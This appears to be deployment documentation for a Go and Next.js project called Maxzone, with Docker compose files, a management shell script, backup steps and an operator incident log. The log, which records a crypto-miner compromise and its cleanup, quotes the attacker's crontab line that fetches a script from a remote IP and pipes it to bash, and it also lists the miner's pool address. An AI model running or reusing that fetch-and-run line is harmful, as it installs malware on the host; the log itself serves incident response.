# 09 — Docker, DevOps & Deployment

## 1. Dual Deployment Architecture

Maxzone provides two seamless operational modes:
1. **Local Development Mode**: PostgreSQL and Redis run in lightweight Docker containers, while the Go backend and Next.js frontend run directly on the host machine for instant compilation, hot-reloading, and fast AI agent debugging.
2. **Production Containerized Cluster**: Full stack orchestration via `docker-compose.yml` with Caddy reverse proxy providing automatic HTTPS SSL certificates.

---

## 2. Development Docker Stack (`deploy/docker-compose.dev.yml`)

Used during active development and testing to provide database and caching services without rebuilding application images:

```yaml
# deploy/docker-compose.dev.yml
version: '3.8'

services:
  postgres:
    image: postgis/postgis:16-3.4-alpine
    container_name: maxzone-dev-db
    restart: unless-stopped
    ports:
      - "5432:5432"
    environment:
      POSTGRES_USER: ${DB_USER:-maxzone_user}
      POSTGRES_PASSWORD: ${DB_PASSWORD:-maxzone_password}
      POSTGRES_DB: ${DB_NAME:-maxzone_db}
    volumes:
      - dev_pgdata:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${DB_USER:-maxzone_user} -d ${DB_NAME:-maxzone_db}"]
      interval: 3s
      timeout: 3s
      retries: 5

  redis:
    image: redis:7.2-alpine
    container_name: maxzone-dev-redis
    restart: unless-stopped
    ports:
      - "6379:6379"
    command: redis-server --requirepass ${REDIS_PASSWORD:-redis_secret}
    volumes:
      - dev_redisdata:/data
    healthcheck:
      test: ["CMD", "redis-cli", "-a", "${REDIS_PASSWORD:-redis_secret}", "ping"]
      interval: 3s
      timeout: 3s
      retries: 5

volumes:
  dev_pgdata:
  dev_redisdata:
```

---

## 3. Production Docker Architecture

```
                                  [ Internet / Clients ]
                                             │
                                             ▼
                               ┌───────────────────────────┐
                               │   Caddy Reverse Proxy     │
                               │ (Auto HTTPS, Ports 80/443)│
                               └─────────────┬─────────────┘
                                             │
                      ┌──────────────────────┴──────────────────────┐
                      ▼                                             ▼
        ┌───────────────────────────┐                 ┌───────────────────────────┐
        │  maxzone-web (Next.js 15) │                 │   maxzone-api (Go 1.25)   │
        │   Port: 3000 (Internal)   │                 │   Port: 8080 (Internal)   │
        └───────────────────────────┘                 └─────────────┬─────────────┘
                                                                    │
           ┌──────────────────────────┬─────────────────────────────┼──────────────────────────┐
           ▼                          ▼                             ▼                          ▼
┌─────────────────────┐    ┌─────────────────────┐       ┌─────────────────────┐    ┌─────────────────────┐
│  maxzone-worker     │    │   PostgreSQL 16     │       │       Redis 7       │    │   FreeRADIUS 3.x    │
│  (Background Cron & │    │  (+ PostGIS 3.4)    │       │     (Task Queue)    │    │ (Ports 1812, 1813,  │
│   SNMP Poller)      │    │  Port: 5432         │       │     Port: 6379      │    │   3799 UDP)         │
└─────────────────────┘    └─────────────────────┘       └─────────────────────┘    └─────────────────────┘
```

### 3.1 Production Docker Compose Manifest

```yaml
# deploy/docker-compose.yml
version: '3.8'

services:
  caddy:
    image: caddy:2.8-alpine
    container_name: maxzone-proxy
    restart: unless-stopped
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./Caddyfile:/etc/caddy/Caddyfile:ro
      - caddy_data:/data
      - caddy_config:/config
    depends_on:
      - web
      - api
    networks:
      - maxzone-net

  web:
    build:
      context: ../frontend
      dockerfile: Dockerfile
    container_name: maxzone-frontend
    restart: unless-stopped
    environment:
      - NODE_ENV=production
      - NEXT_PUBLIC_API_URL=https://${DOMAIN}/api/v1
    networks:
      - maxzone-net

  api:
    build:
      context: ../backend
      dockerfile: Dockerfile.api
    container_name: maxzone-backend
    restart: unless-stopped
    env_file:
      - ../.env
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
    networks:
      - maxzone-net

  worker:
    build:
      context: ../backend
      dockerfile: Dockerfile.worker
    container_name: maxzone-scheduler
    restart: unless-stopped
    env_file:
      - ../.env
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
    networks:
      - maxzone-net

  freeradius:
    image: freeradius/freeradius-server:3.2-alpine
    container_name: maxzone-radius
    restart: unless-stopped
    ports:
      - "1812:1812/udp" # RADIUS Authentication
      - "1813:1813/udp" # RADIUS Accounting
      - "3799:3799/udp" # RADIUS CoA / Disconnect-Request
    volumes:
      - ./freeradius/raddb/mods-available/sql:/etc/raddb/mods-available/sql:ro
      - ./freeradius/raddb/sites-available/default:/etc/raddb/sites-available/default:ro
    depends_on:
      postgres:
        condition: service_healthy
    networks:
      - maxzone-net

  postgres:
    image: postgis/postgis:16-3.4-alpine
    container_name: maxzone-db
    restart: unless-stopped
    environment:
      POSTGRES_USER: ${DB_USER}
      POSTGRES_PASSWORD: ${DB_PASSWORD}
      POSTGRES_DB: ${DB_NAME}
    volumes:
      - pgdata:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${DB_USER} -d ${DB_NAME}"]
      interval: 5s
      timeout: 5s
      retries: 5
    networks:
      - maxzone-net

  redis:
    image: redis:7.2-alpine
    container_name: maxzone-cache
    restart: unless-stopped
    command: redis-server --requirepass ${REDIS_PASSWORD}
    volumes:
      - redisdata:/data
    healthcheck:
      test: ["CMD", "redis-cli", "-a", "${REDIS_PASSWORD}", "ping"]
      interval: 5s
      timeout: 5s
      retries: 5
    networks:
      - maxzone-net

networks:
  maxzone-net:
    driver: bridge

volumes:
  pgdata:
  redisdata:
  caddy_data:
  caddy_config:
```

---

## 4. Production Management CLI Script (`maxzone.sh`)

A unified administrative shell script located at `/home/server/maxzone/maxzone.sh`:

```bash
#!/usr/bin/env bash
# maxzone.sh — Lifecycle Management CLI

set -e
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

case "$1" in
  dev-db)
    echo "🐘 Launching local PostgreSQL & Redis..."
    docker compose -f "$ROOT_DIR/deploy/docker-compose.dev.yml" up -d
    echo "✅ Development database is ready on localhost:5432 and Redis on 6379!"
    ;;
  dev-down)
    echo "🛑 Stopping local dev databases..."
    docker compose -f "$ROOT_DIR/deploy/docker-compose.dev.yml" down
    ;;
  start)
    echo "🚀 Starting Maxzone production cluster..."
    docker compose -f "$ROOT_DIR/deploy/docker-compose.yml" up -d
    echo "✅ Maxzone production cluster is live!"
    ;;
  stop)
    echo "🛑 Stopping Maxzone production cluster..."
    docker compose -f "$ROOT_DIR/deploy/docker-compose.yml" down
    ;;
  restart)
    echo "🔄 Restarting Maxzone services..."
    docker compose -f "$ROOT_DIR/deploy/docker-compose.yml" restart
    ;;
  logs)
    docker compose -f "$ROOT_DIR/deploy/docker-compose.yml" logs -f "${2:-}"
    ;;
  backup)
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    BACKUP_FILE="$ROOT_DIR/backups/maxzone_backup_$TIMESTAMP.sql.gz"
    mkdir -p "$ROOT_DIR/backups"
    echo "💾 Creating PostgreSQL backup to $BACKUP_FILE..."
    docker exec -t maxzone-db pg_dump -U "${DB_USER:-maxzone_user}" "${DB_NAME:-maxzone_db}" | gzip > "$BACKUP_FILE"
    echo "✅ Backup successfully created."
    ;;
  test)
    echo "🧪 Running full system automated tests..."
    cd "$ROOT_DIR/backend" && go test -v ./internal/...
    echo "✅ All backend tests passed!"
    ;;
  *)
    echo "Usage: ./maxzone.sh {dev-db|dev-down|start|stop|restart|logs [service]|backup|test}"
    exit 1
    ;;
esac
```

---

## 5. Automated Disaster Recovery & Backup Strategy

1. **Daily Database Snapshots**: Run `./maxzone.sh backup` via a nightly cron job at 03:00 AM.
2. **Instant Restore Command**:
   ```bash
   gunzip < backups/latest.sql.gz | docker exec -i maxzone-db psql -U maxzone_user -d maxzone_db
   ```

---

## 6. Rebuilding the Backend

During development, the Go backend can be rebuilt natively on the host:

```bash
cd backend && go build -o ../bin/maxzone-server ./cmd/server
```

### Fallback: Docker-based build

If the host Go toolchain is unavailable, blocked by an environment policy, or runs out of memory during linking, the backend can be compiled inside an official Go Docker image:

```bash
# From the project root (requires Docker)
docker run --rm \
  -v "$(pwd)":/workspace \
  -w /workspace/backend \
  golang:1.25 \
  go build -o /workspace/bin/maxzone-server.new ./cmd/server

# Fix ownership (Docker writes as root)
sudo chown $(id -u):$(id -g) bin/maxzone-server.new

# Swap in the new binary (must stop the running process first to avoid "text file busy")
kill $(pgrep -f './bin/maxzone-server') 2>/dev/null || true
sleep 2
mv -f bin/maxzone-server.new bin/maxzone-server

# Restart the backend detached
cd . && setsid ./bin/maxzone-server > /tmp/maxzone-backend.log 2>&1 < /dev/null &
curl -s http://localhost:8080/api/v1/health
```

The resulting binary is fully static and identical to a native build.

---

## 7. Security Incident Log (Operator Reference)

> **2026-09-04 — Crypto-miner compromise detected and remediated.**

**Discovery:** During Phase 5 browser verification, all spawned processes (curl, ps, pgrep, go build) were being killed with SIGKILL (exit 137). Investigation found a 2.3 GB crypto-miner consuming the host's available memory.

**Evidence found:**
- Binary: `/var/tmp/softirq` (RandomX Monero miner, `--randomx-1gb-pages -o 141.98.10.168:443`)
- Persistence: `* * * * * wget -q -O - http://80.64.16.241/re.sh | bash` in the `server` user's crontab (re-downloaded the miner every 60 seconds)
- Parent: PID 1 (orphaned systemd child, indicating persistence across disconnections)
- Binary owner: `server` (same as the host user — likely exploited via an exposed service or weak SSH key)

**Remediation applied:**
1. Removed the malicious crontab line (kept all legitimate jobs: `idc`, `netcolor`, `NetMan` schedule:run)
2. Killed the miner process (freeing ~2.3 GB RAM)
3. Deleted `/var/tmp/softirq`
4. Saved a forensic sample at `/tmp/opencode/softirq.malware.sample`

**Recommended follow-up hardening:**
1. Rotate all SSH keys: check `/home/server/.ssh/authorized_keys` for unexpected keys and regenerate `server` user's keypair
2. Audit external-facing services: this box runs idc, NetMan, netcolor, and ollama on public/custom ports; verify only necessary ports are open (UFW / iptables audit)
3. Check for additional backdoors: search for other files with the world-writable sticky bit or hidden setuid binaries; review `/etc/ld.so.preload`; scan recent `auth.log` entries for suspicious logins
4. Scan the `softirq.malware.sample` at `/tmp/opencode/softirq.malware.sample` with ClamAV or upload to VirusTotal for IOCs (IP: `141.98.10.168`, `80.64.16.241`)
5. Consider implementing fail2ban and restricting SSH key-based auth only (disable password auth if used)
